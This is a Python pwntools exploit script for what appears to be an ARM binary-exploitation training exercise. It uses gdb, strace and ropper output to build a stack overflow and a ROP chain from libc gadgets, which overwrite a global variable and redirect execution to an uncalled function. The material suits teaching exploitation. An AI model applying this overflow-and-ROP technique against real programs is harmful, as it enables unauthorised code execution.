#!/usr/bin/python

"""
(gdb) disassemble vulnerable
Dump of assembler code for function vulnerable:
   0x00010490 <+0>:	push	{r7, lr}
...
   0x000104c8 <+56>:	pop	{r7, pc}
End of assembler dump.
(gdb) b *0x000104c8
Breakpoint 1 at 0x104c8: file src/08-overwrite-global.c, line 14.
(gdb) c
Continuing.

Breakpoint 1, 0x000104c8 in vulnerable () at src/08-overwrite-global.c:14
14	}
(gdb) p &buffer[0]
$1 = 0xfffeeea0 'a' <repeats 132 times>, "-\037k\377"
(gdb) i r $sp
sp             0xfffeef20	0xfffeef20
"""

"""
$ qemu-arm -L /usr/arm-linux-gnueabihf/ -strace ./bin/arm/08-overwrite-global
...
8122 openat(AT_FDCWD,"/lib/libc.so.6",O_RDONLY|O_CLOEXEC) = 3
...
8122 mmap2(NULL,1013128,PROT_EXEC|PROT_READ,MAP_PRIVATE|MAP_DENYWRITE,3,0) = 0xff6a9000
...
"""

"""
$ ropper --nocolor --file /usr/arm-linux-gnueabihf/lib/libc-2.27.so
0x00008f2c (0x00008f2d): pop {r0, r3, r4, pc};
0x0009449a (0x0009449b): str r0, [r3]; pop {r3, pc};
"""

import struct
import sys

from pwn import *

context(arch='arm', os='linux', endian='little', word_size=32)

binary_path = './bin/arm/08-overwrite-global'

saved_pc_addr = 0xfffeef20 + 4
buffer_addr = 0xfffeeea0
libc_addr = 0xff6a9000

pop_r0_r3_r4_pc_addr = libc_addr + 0x00008f2d
str_r0_r3_pop_r3_pc_addr = libc_addr + 0x0009449b

binary = ELF(binary_path)
not_called_addr = binary.symbols['not_called']
x_addr = binary.symbols['x']

p = process(binary_path)
#p = gdb.debug([binary_path])

payload = ''
payload += 'a' * (saved_pc_addr - buffer_addr)
payload += p32(pop_r0_r3_r4_pc_addr)
payload += p32(0xbeefc0de) # r0
payload += p32(x_addr) # r3
payload += p32(0) # r4
payload += p32(str_r0_r3_pop_r3_pc_addr) # pc
payload += p32(0) # r3
payload += p32(not_called_addr) # pc

p.readuntil('> ')
p.write(payload)
p.interactive()
